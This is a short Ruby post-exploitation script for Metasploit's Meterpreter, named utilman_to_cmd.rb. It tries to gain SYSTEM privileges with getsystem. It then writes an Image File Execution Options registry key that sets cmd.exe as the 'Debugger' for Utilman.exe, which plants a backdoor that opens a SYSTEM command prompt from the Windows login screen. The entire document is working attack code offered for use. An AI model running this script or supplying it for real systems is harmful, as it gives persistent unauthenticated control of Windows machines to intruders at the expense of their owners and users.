#utilman_to_cmd.rb
#author: sushiwushi
begin
print_status ("Checking for administrative privileges...")
admin_check = is_admin?
if admin_check
  print_good ("Administrative privileges found, continuing...")
  client.priv.getsystem
  Utilman="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe"
  registry_createkey(Utilman)
  registry_setvaldata(Utilman,'Debugger', 'cmd.exe','REG_SZ')
  print_good ("Done.")
else
  print_error ("No administrative privileges found!\n")
  print_status ("Attempting to obtain administrative privileges")
  client.priv.getsystem
end
rescue Rex::Post::Meterpreter::RequestError
print_error ("Failed to obtain administrative privileges")
end
